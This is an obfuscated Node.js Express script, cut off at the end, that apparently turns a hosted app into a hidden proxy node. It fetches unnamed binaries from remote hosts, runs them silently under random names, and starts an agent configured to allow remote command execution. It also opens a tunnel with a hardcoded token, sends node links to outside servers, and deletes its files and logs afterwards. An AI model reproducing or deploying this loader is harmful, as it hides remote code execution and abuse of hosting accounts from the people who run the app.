const _0x2f54a0=_0x34be;(function(_0x4b54c7,_0x478c56){const _0x2554a4=_0x34be,_0x4f4e22=_0x4b54c7();while(!![]){try{const _0x1615f5=parseInt(_0x2554a4(0x15b))/0x1*(parseInt(_0x2554a4(0x139))/0x2)+parseInt(_0x2554a4(0xe1))/0x3+parseInt(_0x2554a4(0xfd))/0x4+parseInt(_0x2554a4(0x15e))/0x5*(-parseInt(_0x2554a4(0xe4))/0x6)+parseInt(_0x2554a4(0xfb))/0x7+parseInt(_0x2554a4(0xd8))/0x8*(parseInt(_0x2554a4(0xdf))/0x9)+parseInt(_0x2554a4(0x15d))/0xa*(-parseInt(_0x2554a4(0xf3))/0xb);if(_0x1615f5===_0x478c56)break;else _0x4f4e22['push'](_0x4f4e22['shift']());}catch(_0x5433a8){_0x4f4e22['push'](_0x4f4e22['shift']());}}}(_0x3701,0xd4a30));function _0x3701(){const _0x243a60=['Unknown','firefox','length','galaxy.bp77.pp.ua','base64','https://arm64.ssss.nyc.mn/bot','Error\x20reading\x20boot.log:','isFile','pop','&path=%2Fvless-argo%3Fed%3D2560#','\x0aclient_secret:\x20','Service\x20is\x20runing!<br><br>You\x20can\x20visit\x20/{SUB_PATH}(Default:\x20/sub)\x20get\x20your\x20nodes!','NEZHA_KEY','floor','cdns.doon.eu.org','PORT','stringify','win32','App\x20is\x20running','split','quic','519362SGZtCr','SUB_PATH','4490BJgmEK','5rivlpk','/api/add-subscriptions','ARGO_PORT','vless','?encryption=none&security=tls&sni=','abc','TunnelSecret','UPLOAD_URL','env','readdirSync','arch','web\x20running\x20error:\x20','https://amd64.ssss.nyc.mn/v1','org','aarch64','exec','amd','all','tunnel.json','get','message','https://oooo.serv00.net/add-url','\x20-p\x20','platform','text/plain;\x20charset=utf-8','includes','?security=tls&sni=','promises','2053','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','createWriteStream','automatic\x20access\x20task\x20added\x20successfully','axios','charAt','Subscription\x20uploaded\x20successfully','toString','arm','freedom','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','config.json','ArgoDomain:','true','status','/vless-argo','rm\x20-rf\x20','readFileSync','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','.tmp','forEach','block','http','response','unshift','http\x20server\x20is\x20running\x20on\x20port:','catch','php\x20running\x20error:\x20','clear','none','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','error','direct','\x20already\x20exists','CFPORT','&fp=firefox&type=ws&host=','8IOVtCo','NEZHA_PORT','existsSync','NEZHA_SERVER','/config.json\x20>/dev/null\x202>&1\x20&','config.yaml','taskkill\x20/f\x20/im\x20','4213179svAUUT','/vmess-argo','1114980pqJAJt','https://amd64.ssss.nyc.mn/agent','2096','20118guHZIj','abcdefghijklmnopqrstuvwxyz','mkdirSync','\x20-c\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x20is\x20running','nohup\x20','then','Error\x20executing\x20command:\x20','test','substring','basename','\x0a\x20\x20tunnel:\x20','Galaxy','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','46387iDGTAE','data','chmod','post','false','\x20is\x20created','http://ip-api.com/json','sub.txt','4660411NlROkm','readFile','893832NadrBW','https+local://8.8.8.8/dns-query','Content-Type','unlinkSync','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','trojan','PROJECT_URL','child_process','--tls','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20credentials-file:\x20','83f5a158-5888-4516-8937-77370548fe88','path','fileName','tunnel.yml','join','log','Download\x20','application/json','/api/add-nodes','\x22\x20>\x20/dev/null\x202>&1','index.html','send','/tunnel.yml\x20run','boot.log','NAME','push','tls','from','https://arm64.ssss.nyc.mn/v1','set','list.txt','utf-8','https://ipapi.co/json','127.0.0.1','util','statSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x20>/dev/null\x202>&1','Empowerment\x20failed\x20for\x20','finish','\x0a\x0avmess://','\x20>\x20nul\x202>&1','https://arm64.ssss.nyc.mn/web','https://arm64.ssss.nyc.mn/agent','del\x20/f\x20/q\x20','2083','/vmess-argo?ed=2560','\x20>/dev/null\x202>&1\x20&','443','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','2087','/trojan-argo','8443','close','stream','\x20successfully','vmess','4naxOcC','/api/delete-nodes','listen','random','filter','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','CFIP','match','map','\x20failed:\x20','Error\x20downloading\x20files:','\x0avless://','writeFileSync'];_0x3701=function(){return _0x243a60;};return _0x3701();}const express=require('express'),app=express(),axios=require(_0x2f54a0(0xb7)),os=require('os'),fs=require('fs'),path=require(_0x2f54a0(0x109)),{promisify}=require(_0x2f54a0(0x120)),exec=promisify(require(_0x2f54a0(0x104))[_0x2f54a0(0xa6)]),UPLOAD_URL=process[_0x2f54a0(0x166)][_0x2f54a0(0x165)]||'',PROJECT_URL=process[_0x2f54a0(0x166)][_0x2f54a0(0x103)]||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process['env']['FILE_PATH']||_0x2f54a0(0xc7),SUB_PATH=process[_0x2f54a0(0x166)][_0x2f54a0(0x15c)]||_0x2f54a0(0x163),PORT=process['env']['SERVER_PORT']||process[_0x2f54a0(0x166)][_0x2f54a0(0x155)]||0xbb8,UUID=process['env']['UUID']||_0x2f54a0(0x108),NEZHA_SERVER=process['env'][_0x2f54a0(0xdb)]||'',NEZHA_PORT=process[_0x2f54a0(0x166)][_0x2f54a0(0xd9)]||'',NEZHA_KEY=process['env'][_0x2f54a0(0x152)]||'',ARGO_DOMAIN=process[_0x2f54a0(0x166)]['ARGO_DOMAIN']||_0x2f54a0(0x149),ARGO_AUTH=process[_0x2f54a0(0x166)]['ARGO_AUTH']||'eyJhIjoiZDViMmM5NGE1YjgyOTgyOGY4NDZmNmEwY2Y5NDA2ZGQiLCJ0IjoiMjg1NDBjNDctNTQ2Mi00NjMwLTlhNDMtYzhjZTkzNWQxNzgyIiwicyI6Ik56ZGlNV016WlRjdFltWTFNaTAwTm1ReUxUbGxORFV0WmpZd04yWXlZekU0WW1JMSJ9',ARGO_PORT=process[_0x2f54a0(0x166)][_0x2f54a0(0x160)]||0x1f41,CFIP=process[_0x2f54a0(0x166)][_0x2f54a0(0x13f)]||_0x2f54a0(0x154),CFPORT=process['env'][_0x2f54a0(0xd6)]||0x1bb,NAME=process['env'][_0x2f54a0(0x116)]||_0x2f54a0(0xf1);!fs[_0x2f54a0(0xda)](FILE_PATH)?(fs[_0x2f54a0(0xe6)](FILE_PATH),console[_0x2f54a0(0x10d)](FILE_PATH+_0x2f54a0(0xf8))):console[_0x2f54a0(0x10d)](FILE_PATH+_0x2f54a0(0xd5));function generateRandomName(){const _0x5a7efb=_0x2f54a0,_0x57ed46=_0x5a7efb(0xe5);let _0x188485='';for(let _0x356a8c=0x0;_0x356a8c<0x6;_0x356a8c++){_0x188485+=_0x57ed46[_0x5a7efb(0xb8)](Math[_0x5a7efb(0x153)](Math[_0x5a7efb(0x13c)]()*_0x57ed46['length']));}return _0x188485;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x2f54a0(0x10c)](FILE_PATH,phpName),webPath=path[_0x2f54a0(0x10c)](FILE_PATH,webName),botPath=path[_0x2f54a0(0x10c)](FILE_PATH,botName),subPath=path[_0x2f54a0(0x10c)](FILE_PATH,_0x2f54a0(0xfa)),listPath=path['join'](FILE_PATH,_0x2f54a0(0x11c)),bootLogPath=path[_0x2f54a0(0x10c)](FILE_PATH,_0x2f54a0(0x115)),configPath=path[_0x2f54a0(0x10c)](FILE_PATH,_0x2f54a0(0xbf));function deleteNodes(){const _0x5524f7=_0x2f54a0;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x153968;try{_0x153968=fs[_0x5524f7(0xc5)](subPath,'utf-8');}catch{return null;}const _0x16d1df=Buffer['from'](_0x153968,_0x5524f7(0x14a))[_0x5524f7(0xba)]('utf-8'),_0x41578c=_0x16d1df['split']('\x0a')[_0x5524f7(0x13d)](_0xf4e3fb=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0xf4e3fb));if(_0x41578c[_0x5524f7(0x148)]===0x0)return;return axios[_0x5524f7(0xf6)](UPLOAD_URL+_0x5524f7(0x13a),JSON[_0x5524f7(0x156)]({'nodes':_0x41578c}),{'headers':{'Content-Type':_0x5524f7(0x10f)}})['catch'](_0x106266=>{return null;}),null;}catch(_0x3c8de4){return null;}}function cleanupOldFiles(){const _0xaab138=_0x2f54a0;try{const _0x274a7c=fs[_0xaab138(0xa0)](FILE_PATH);_0x274a7c[_0xaab138(0xc8)](_0x14f2ea=>{const _0x178b22=_0xaab138,_0x51d5b3=path[_0x178b22(0x10c)](FILE_PATH,_0x14f2ea);try{const _0x1b930e=fs[_0x178b22(0x121)](_0x51d5b3);_0x1b930e[_0x178b22(0x14d)]()&&fs[_0x178b22(0x100)](_0x51d5b3);}catch(_0x34a91c){}});}catch(_0x3f9de1){}}async function generateConfig(){const _0x1e9598=_0x2f54a0,_0x1d577e={'log':{'access':'/dev/null','error':'/dev/null','loglevel':_0x1e9598(0xd1)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1e9598(0x161),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x1e9598(0xd1),'fallbacks':[{'dest':0xbb9},{'path':_0x1e9598(0xc3),'dest':0xbba},{'path':_0x1e9598(0xe0),'dest':0xbbb},{'path':_0x1e9598(0x133),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x1e9598(0x11f),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x1e9598(0xd1)}},{'port':0xbba,'listen':_0x1e9598(0x11f),'protocol':_0x1e9598(0x161),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x1e9598(0xd1),'wsSettings':{'path':_0x1e9598(0xc3)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x1e9598(0x118),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x1e9598(0x138),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x1e9598(0xe0)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x1e9598(0x118),_0x1e9598(0x15a)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1e9598(0x11f),'protocol':_0x1e9598(0x102),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1e9598(0xd1),'wsSettings':{'path':_0x1e9598(0x133)}},'sniffing':{'enabled':!![],'destOverride':[_0x1e9598(0xca),_0x1e9598(0x118),_0x1e9598(0x15a)],'metadataOnly':![]}}],'dns':{'servers':[_0x1e9598(0xfe)]},'outbounds':[{'protocol':_0x1e9598(0xbc),'tag':_0x1e9598(0xd4)},{'protocol':'blackhole','tag':_0x1e9598(0xc9)}]};fs[_0x1e9598(0x145)](path[_0x1e9598(0x10c)](FILE_PATH,_0x1e9598(0xbf)),JSON[_0x1e9598(0x156)](_0x1d577e,null,0x2));}function getSystemArchitecture(){const _0x2fcb2e=_0x2f54a0,_0x592b05=os[_0x2fcb2e(0xa1)]();return _0x592b05===_0x2fcb2e(0xbb)||_0x592b05==='arm64'||_0x592b05===_0x2fcb2e(0xa5)?_0x2fcb2e(0xbb):_0x2fcb2e(0xa7);}function downloadFile(_0x10dd00,_0x5bffde,_0x594c9c){const _0x30e22d=_0x2f54a0,_0x40871c=_0x10dd00;!fs[_0x30e22d(0xda)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x5e2b8e=fs[_0x30e22d(0xb5)](_0x40871c);axios({'method':_0x30e22d(0xaa),'url':_0x5bffde,'responseType':_0x30e22d(0x136)})[_0x30e22d(0xeb)](_0x441568=>{const _0x3be9c1=_0x30e22d;_0x441568[_0x3be9c1(0xf4)]['pipe'](_0x5e2b8e),_0x5e2b8e['on'](_0x3be9c1(0x125),()=>{const _0x15b0a2=_0x3be9c1;_0x5e2b8e[_0x15b0a2(0x135)](),console[_0x15b0a2(0x10d)]('Download\x20'+path[_0x15b0a2(0xef)](_0x40871c)+_0x15b0a2(0x137)),_0x594c9c(null,_0x40871c);}),_0x5e2b8e['on'](_0x3be9c1(0xd3),_0xe34704=>{const _0x1d4b1d=_0x3be9c1;fs['unlink'](_0x40871c,()=>{});const _0xc5e297='Download\x20'+path[_0x1d4b1d(0xef)](_0x40871c)+_0x1d4b1d(0x142)+_0xe34704['message'];console[_0x1d4b1d(0xd3)](_0xc5e297),_0x594c9c(_0xc5e297);});})[_0x30e22d(0xce)](_0x17eba3=>{const _0x21bd8c=_0x30e22d,_0x2fe8d8=_0x21bd8c(0x10e)+path[_0x21bd8c(0xef)](_0x40871c)+'\x20failed:\x20'+_0x17eba3[_0x21bd8c(0xab)];console[_0x21bd8c(0xd3)](_0x2fe8d8),_0x594c9c(_0x2fe8d8);});}async function downloadFilesAndRun(){const _0x462dea=_0x2f54a0,_0x1f853f=getSystemArchitecture(),_0x2f1994=getFilesForArchitecture(_0x1f853f);if(_0x2f1994[_0x462dea(0x148)]===0x0){console[_0x462dea(0x10d)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x1d2559=_0x2f1994[_0x462dea(0x141)](_0xb8ce86=>{return new Promise((_0xc66e32,_0x30caa8)=>{const _0x20111f=_0x34be;downloadFile(_0xb8ce86[_0x20111f(0x10a)],_0xb8ce86['fileUrl'],(_0x201d90,_0x31d817)=>{_0x201d90?_0x30caa8(_0x201d90):_0xc66e32(_0x31d817);});});});try{await Promise[_0x462dea(0xa8)](_0x1d2559);}catch(_0x192a29){console['error'](_0x462dea(0x143),_0x192a29);return;}function _0x367581(_0xd679c1){const _0x4ee2d4=0x1fd;_0xd679c1['forEach'](_0x1287ec=>{const _0x498f13=_0x34be;fs['existsSync'](_0x1287ec)&&fs[_0x498f13(0xf5)](_0x1287ec,_0x4ee2d4,_0x3bc673=>{const _0x2e3c30=_0x498f13;_0x3bc673?console[_0x2e3c30(0xd3)](_0x2e3c30(0x124)+_0x1287ec+':\x20'+_0x3bc673):console[_0x2e3c30(0x10d)]('Empowerment\x20success\x20for\x20'+_0x1287ec+':\x20'+_0x4ee2d4[_0x2e3c30(0xba)](0x8));});});}const _0x564bd0=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x367581(_0x564bd0);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x32b67a=NEZHA_SERVER[_0x462dea(0xb0)](':')?NEZHA_SERVER[_0x462dea(0x159)](':')[_0x462dea(0x14e)]():'',_0x240434=new Set([_0x462dea(0x12e),_0x462dea(0x134),_0x462dea(0xe3),'2087','2083',_0x462dea(0xb3)]),_0x20d200=_0x240434['has'](_0x32b67a)?_0x462dea(0xc1):_0x462dea(0xf7),_0x4b19da=_0x462dea(0x150)+NEZHA_KEY+_0x462dea(0x12f)+NEZHA_SERVER+_0x462dea(0x101)+_0x20d200+_0x462dea(0xc6)+UUID;fs[_0x462dea(0x145)](path[_0x462dea(0x10c)](FILE_PATH,_0x462dea(0xdd)),_0x4b19da);const _0x1d320c=_0x462dea(0xea)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x462dea(0x106);try{await exec(_0x1d320c),console['log'](phpName+_0x462dea(0xe9)),await new Promise(_0x2588a9=>setTimeout(_0x2588a9,0x3e8));}catch(_0x24affa){console[_0x462dea(0xd3)](_0x462dea(0xcf)+_0x24affa);}}else{let _0x15b461='';const _0x28e6b0=[_0x462dea(0x12e),_0x462dea(0x134),_0x462dea(0xe3),_0x462dea(0x132),_0x462dea(0x12b),_0x462dea(0xb3)];_0x28e6b0[_0x462dea(0xb0)](NEZHA_PORT)&&(_0x15b461=_0x462dea(0x105));const _0x54054a='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x462dea(0xad)+NEZHA_KEY+'\x20'+_0x15b461+_0x462dea(0x13e);try{await exec(_0x54054a),console[_0x462dea(0x10d)](npmName+_0x462dea(0xe9)),await new Promise(_0x2ebccd=>setTimeout(_0x2ebccd,0x3e8));}catch(_0x46089d){console[_0x462dea(0xd3)]('npm\x20running\x20error:\x20'+_0x46089d);}}}else console[_0x462dea(0x10d)](_0x462dea(0xe8));const _0x408191=_0x462dea(0xea)+webPath+_0x462dea(0xe7)+FILE_PATH+_0x462dea(0xdc);try{await exec(_0x408191),console[_0x462dea(0x10d)](webName+_0x462dea(0xe9)),await new Promise(_0x14e481=>setTimeout(_0x14e481,0x3e8));}catch(_0x4b1962){console[_0x462dea(0xd3)](_0x462dea(0xa2)+_0x4b1962);}if(fs[_0x462dea(0xda)](botPath)){let _0x586b98;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x586b98=_0x462dea(0x131)+ARGO_AUTH;else ARGO_AUTH[_0x462dea(0x140)](/TunnelSecret/)?_0x586b98='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x462dea(0x114):_0x586b98=_0x462dea(0x122)+FILE_PATH+_0x462dea(0x130)+ARGO_PORT;try{await exec(_0x462dea(0xea)+botPath+'\x20'+_0x586b98+_0x462dea(0x12d)),console[_0x462dea(0x10d)](botName+_0x462dea(0xe9)),await new Promise(_0x1be75a=>setTimeout(_0x1be75a,0x7d0));}catch(_0x466713){console[_0x462dea(0xd3)](_0x462dea(0xec)+_0x466713);}}await new Promise(_0x28169f=>setTimeout(_0x28169f,0x1388));}function getFilesForArchitecture(_0x47dd36){const _0x35dfc9=_0x2f54a0;let _0x4294e5;_0x47dd36===_0x35dfc9(0xbb)?_0x4294e5=[{'fileName':webPath,'fileUrl':_0x35dfc9(0x128)},{'fileName':botPath,'fileUrl':_0x35dfc9(0x14b)}]:_0x4294e5=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5d6146=_0x47dd36===_0x35dfc9(0xbb)?_0x35dfc9(0x129):_0x35dfc9(0xe2);_0x4294e5[_0x35dfc9(0xcc)]({'fileName':npmPath,'fileUrl':_0x5d6146});}else{const _0x3aa311=_0x47dd36===_0x35dfc9(0xbb)?_0x35dfc9(0x11a):_0x35dfc9(0xa3);_0x4294e5[_0x35dfc9(0xcc)]({'fileName':phpPath,'fileUrl':_0x3aa311});}}return _0x4294e5;}function argoType(){const _0x1bfa4b=_0x2f54a0;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x1bfa4b(0xb0)](_0x1bfa4b(0x164))){fs[_0x1bfa4b(0x145)](path[_0x1bfa4b(0x10c)](FILE_PATH,_0x1bfa4b(0xa9)),ARGO_AUTH);const _0x55bcbb=_0x1bfa4b(0xf0)+ARGO_AUTH['split']('\x22')[0xb]+_0x1bfa4b(0x107)+path[_0x1bfa4b(0x10c)](FILE_PATH,'tunnel.json')+_0x1bfa4b(0xbd)+ARGO_DOMAIN+_0x1bfa4b(0xb4)+ARGO_PORT+_0x1bfa4b(0xd2);fs[_0x1bfa4b(0x145)](path[_0x1bfa4b(0x10c)](FILE_PATH,_0x1bfa4b(0x10b)),_0x55bcbb);}else console[_0x1bfa4b(0x10d)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x150e29=_0x2f54a0;let _0x509b2f;if(ARGO_AUTH&&ARGO_DOMAIN)_0x509b2f=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x509b2f),await _0x3561cc(_0x509b2f);else try{const _0x34b972=fs[_0x150e29(0xc5)](path[_0x150e29(0x10c)](FILE_PATH,_0x150e29(0x115)),'utf-8'),_0x464e22=_0x34b972[_0x150e29(0x159)]('\x0a'),_0xaf8ffc=[];_0x464e22[_0x150e29(0xc8)](_0x57e9d0=>{const _0x8d7350=_0x150e29,_0x25333f=_0x57e9d0[_0x8d7350(0x140)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x25333f){const _0x572594=_0x25333f[0x1];_0xaf8ffc[_0x8d7350(0x117)](_0x572594);}});if(_0xaf8ffc['length']>0x0)_0x509b2f=_0xaf8ffc[0x0],console[_0x150e29(0x10d)](_0x150e29(0xc0),_0x509b2f),await _0x3561cc(_0x509b2f);else{console['log'](_0x150e29(0xf2)),fs[_0x150e29(0x100)](path['join'](FILE_PATH,_0x150e29(0x115)));async function _0x302ae5(){const _0x344c50=_0x150e29;try{process['platform']===_0x344c50(0x157)?await exec(_0x344c50(0xde)+botName+'.exe\x20>\x20nul\x202>&1'):await exec('pkill\x20-f\x20\x22['+botName['charAt'](0x0)+']'+botName[_0x344c50(0xee)](0x1)+_0x344c50(0x111));}catch(_0x3c80af){}}_0x302ae5(),await new Promise(_0x10a61c=>setTimeout(_0x10a61c,0xbb8));const _0x16d4e3=_0x150e29(0x122)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x150e29(0xea)+botPath+'\x20'+_0x16d4e3+_0x150e29(0x12d)),console[_0x150e29(0x10d)](botName+_0x150e29(0xe9)),await new Promise(_0xe48c5b=>setTimeout(_0xe48c5b,0xbb8)),await extractDomains();}catch(_0x3f9030){console[_0x150e29(0xd3)](_0x150e29(0xec)+_0x3f9030);}}}catch(_0x48e796){console['error'](_0x150e29(0x14c),_0x48e796);}async function _0xfecdc5(){const _0x254f74=_0x150e29;try{const _0x366c7f=await axios['get'](_0x254f74(0x11e),{'timeout':0xbb8});if(_0x366c7f[_0x254f74(0xf4)]&&_0x366c7f[_0x254f74(0xf4)]['country_code']&&_0x366c7f['data'][_0x254f74(0xa4)])return _0x366c7f[_0x254f74(0xf4)]['country_code']+'_'+_0x366c7f['data'][_0x254f74(0xa4)];}catch(_0x46629d){try{const _0x25c021=await axios[_0x254f74(0xaa)](_0x254f74(0xf9),{'timeout':0xbb8});if(_0x25c021[_0x254f74(0xf4)]&&_0x25c021['data']['status']==='success'&&_0x25c021[_0x254f74(0xf4)]['countryCode']&&_0x25c021[_0x254f74(0xf4)][_0x254f74(0xa4)])return _0x25c021[_0x254f74(0xf4)]['countryCode']+'_'+_0x25c021['data']['org'];}catch(_0x3b6abd){}}return _0x254f74(0x146);}async function _0x3561cc(_0x3f4238){const _0x541287=await _0xfecdc5(),_0xf63225=NAME?NAME+'-'+_0x541287:_0x541287;return new Promise(_0x3be511=>{setTimeout(()=>{const _0x336ed4=_0x34be,_0x3f2ee6={'v':'2','ps':''+_0xf63225,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x336ed4(0xd1),'net':'ws','type':_0x336ed4(0xd1),'host':_0x3f4238,'path':_0x336ed4(0x12c),'tls':_0x336ed4(0x118),'sni':_0x3f4238,'alpn':'','fp':_0x336ed4(0x147)},_0x2fdbee=_0x336ed4(0x144)+UUID+'@'+CFIP+':'+CFPORT+_0x336ed4(0x162)+_0x3f4238+_0x336ed4(0xd7)+_0x3f4238+_0x336ed4(0x14f)+_0xf63225+_0x336ed4(0x126)+Buffer[_0x336ed4(0x119)](JSON['stringify'](_0x3f2ee6))[_0x336ed4(0xba)](_0x336ed4(0x14a))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x336ed4(0xb1)+_0x3f4238+_0x336ed4(0xd7)+_0x3f4238+_0x336ed4(0xbe)+_0xf63225+'\x0a\x20\x20\x20\x20';console[_0x336ed4(0x10d)](Buffer['from'](_0x2fdbee)['toString'](_0x336ed4(0x14a))),fs[_0x336ed4(0x145)](subPath,Buffer['from'](_0x2fdbee)[_0x336ed4(0xba)]('base64')),console[_0x336ed4(0x10d)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x336ed4(0xaa)]('/'+SUB_PATH,(_0x16ff69,_0x5a458d)=>{const _0x2aca5a=_0x336ed4,_0x169e82=Buffer[_0x2aca5a(0x119)](_0x2fdbee)[_0x2aca5a(0xba)]('base64');_0x5a458d[_0x2aca5a(0x11b)](_0x2aca5a(0xff),_0x2aca5a(0xaf)),_0x5a458d[_0x2aca5a(0x113)](_0x169e82);}),_0x3be511(_0x2fdbee);},0x7d0);});}}async function uploadNodes(){const _0x61fb75=_0x2f54a0;if(UPLOAD_URL&&PROJECT_URL){const _0xec837e=PROJECT_URL+'/'+SUB_PATH,_0x4a770e={'subscription':[_0xec837e]};try{const _0x49767a=await axios['post'](UPLOAD_URL+_0x61fb75(0x15f),_0x4a770e,{'headers':{'Content-Type':_0x61fb75(0x10f)}});return _0x49767a&&_0x49767a[_0x61fb75(0xc2)]===0xc8?(console[_0x61fb75(0x10d)](_0x61fb75(0xb9)),_0x49767a):null;}catch(_0x3ba0aa){if(_0x3ba0aa['response']){if(_0x3ba0aa[_0x61fb75(0xcb)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x25d77f=fs[_0x61fb75(0xc5)](listPath,_0x61fb75(0x11d)),_0x10a419=_0x25d77f['split']('\x0a')[_0x61fb75(0x13d)](_0x1d2a30=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x61fb75(0xed)](_0x1d2a30));if(_0x10a419['length']===0x0)return;const _0x44d489=JSON['stringify']({'nodes':_0x10a419});try{const _0x30ef41=await axios[_0x61fb75(0xf6)](UPLOAD_URL+_0x61fb75(0x110),_0x44d489,{'headers':{'Content-Type':_0x61fb75(0x10f)}});return _0x30ef41&&_0x30ef41['status']===0xc8?(console['log']('Nodes\x20uploaded\x20successfully'),_0x30ef41):null;}catch(_0xa3cd5e){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x4946d9=_0x34be,_0x267793=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x267793[_0x4946d9(0x117)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x267793[_0x4946d9(0x117)](phpPath);process[_0x4946d9(0xae)]===_0x4946d9(0x157)?exec(_0x4946d9(0x12a)+_0x267793[_0x4946d9(0x10c)]('\x20')+_0x4946d9(0x127),_0x1aa563=>{const _0x162938=_0x4946d9;console[_0x162938(0xd0)](),console[_0x162938(0x10d)](_0x162938(0x158)),console[_0x162938(0x10d)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x4946d9(0xc4)+_0x267793[_0x4946d9(0x10c)]('\x20')+_0x4946d9(0x123),_0x5c6fd6=>{const _0x813a3c=_0x4946d9;console[_0x813a3c(0xd0)](),console['log'](_0x813a3c(0x158)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}function _0x34be(_0x29c6f8,_0x58ac94){_0x29c6f8=_0x29c6f8-0xa0;const _0x3701b8=_0x3701();let _0x34be1f=_0x3701b8[_0x29c6f8];return _0x34be1f;}cleanFiles();async function AddVisitTask(){const _0x4bc646=_0x2f54a0;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x3f58ef=await axios[_0x4bc646(0xf6)](_0x4bc646(0xac),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4bc646(0x10f)}});return console[_0x4bc646(0x10d)](_0x4bc646(0xb6)),_0x3f58ef;}catch(_0x13e73f){return console[_0x4bc646(0xd3)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x13e73f[_0x4bc646(0xab)]),null;}}async function startserver(){const _0x4a17ff=_0x2f54a0;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x317a9e){console[_0x4a17ff(0xd3)]('Error\x20in\x20startserver:',_0x317a9e);}}startserver()[_0x2f54a0(0xce)](_0x3d4ac1=>{const _0x1fa3b1=_0x2f54a0;console[_0x1fa3b1(0xd3)]('Unhandled\x20error\x20in\x20startserver:',_0x3d4ac1);}),app[_0x2f54a0(0xaa)]('/',async function(_0x54e94c,_0xd2af7c){const _0x5d6cf1=_0x2f54a0;try{const _0x2a3a68=path[_0x5d6cf1(0x10c)](__dirname,_0x5d6cf1(0x112)),_0x3fabea=await 